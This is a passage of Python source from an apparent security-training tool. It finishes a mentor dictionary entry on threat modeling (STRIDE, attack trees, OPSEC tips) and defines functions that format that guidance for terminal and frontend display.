            "Map every finding to a CIS Control violation in your report — boards understand CIS scores.",
            "CIS Benchmarks are the BLUE team's hardening guide — read it for ROOM the defenders left unmitigated.",
        ],
    },

    "threat-modeling": {
        "tldr": (
            "Structured analysis of WHO would attack a system, HOW, and WHAT they'd target. "
            "STRIDE, PASTA, and Attack Trees are the common frameworks. Done BEFORE pentest planning."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "Threat-modeling is whiteboard work — quietest possible activity. "
            "The OPSEC value: a thorough threat model BEFORE you start "
            "running tools tells you WHICH tools are worth running. Random "
            "tool-spam = loud and unfocused. Threat-model-driven scanning = "
            "surgical and quiet because you know exactly what you're "
            "looking for and stop when you find it."
        ),
        "prerequisites": ["target_system_documented"],
        "logical_next": [
            {"tool": "mitre", "noise": "quiet",
             "why": "STRIDE threats map to MITRE ATT&CK techniques — speak both vocabularies."},
            {"tool": "owasp", "noise": "quiet",
             "why": "For web apps, OWASP Top 10 is the threat-model checklist."},
            {"tool": "cia", "noise": "quiet",
             "why": "STRIDE letters map cleanly to CIA — together they generate complete threat coverage."},
        ],
        "opsec_tips": [
            "Threat-model the engagement BEFORE writing any tool commands — you'll save hours of unfocused scanning.",
            "Use STRIDE (Spoofing, Tampering, Repudiation, Info-disclosure, DoS, Elevation) — 6 categories that catch most threats.",
            "Attack trees visualize CHOICE — each branch is a different path to the same goal. Pick the quietest branch.",
            "Threat models age fast — re-run yours after every major finding. New info = new branches worth exploring.",
        ],
    },
}


def get_mentor(topic: str) -> Optional[Dict]:
    """Return the mentor block for a topic, or None if no SOC-mentor data exists yet."""
    return MENTOR.get(topic.lower())


def noise_badge(level: str) -> str:
    """Render a noise-level badge for inline display. Returns icon + label."""
    info = NOISE_LEVELS.get(level, NOISE_LEVELS["medium"])
    return f"{info['icon']} {info['label']}"


def format_mentor_block(topic: str) -> str:
    """
    Render the SOC-mentor section appended to a regular teach lesson.
    Returns a multi-line string for the live terminal, or empty if no
    mentor data exists for this topic.
    """
    m = get_mentor(topic)
    if not m:
        return ""

    lines = []
    lines.append("")
    lines.append("─" * 62)
    lines.append(f"  🥷  SOC MENTOR — {noise_badge(m['noise_level'])}")
    lines.append("─" * 62)
    lines.append(f"\n  {m['tldr']}\n")
    lines.append(f"  WHY {m['noise_level'].upper()}:")
    # Wrap noise_explanation to ~58 chars per line for terminal display
    import textwrap
    for line in textwrap.wrap(m["noise_explanation"], width=58):
        lines.append(f"    {line}")

    lines.append(f"\n  🎯 NEXT BEST STEPS (quietest first):")
    for i, step in enumerate(m["logical_next"], 1):
        lines.append(f"    {i}. [{step['noise'].upper():<6}] {step['tool']}")
        for line in textwrap.wrap(step["why"], width=52):
            lines.append(f"           {line}")

    lines.append(f"\n  🥷 OPSEC TIPS:")
    for tip in m["opsec_tips"]:
        for i, line in enumerate(textwrap.wrap(tip, width=58)):
            prefix = "    • " if i == 0 else "      "
            lines.append(f"{prefix}{line}")

    lines.append("─" * 62)
    return "\n".join(lines)


def get_next_steps_json(topic: str) -> List[Dict]:
    """
    Return the logical_next list as JSON-ready data for the frontend to
    render as clickable buttons. Returns empty list if no mentor data.
    """
    m = get_mentor(topic)
    if not m:
        return []
    return m.get("logical_next", [])


def list_mentor_topics() -> List[str]:
    """Return all topics that have SOC-mentor coverage. Useful for the UI to
    indicate which lessons have the mentor layer enabled."""
    return sorted(MENTOR.keys())
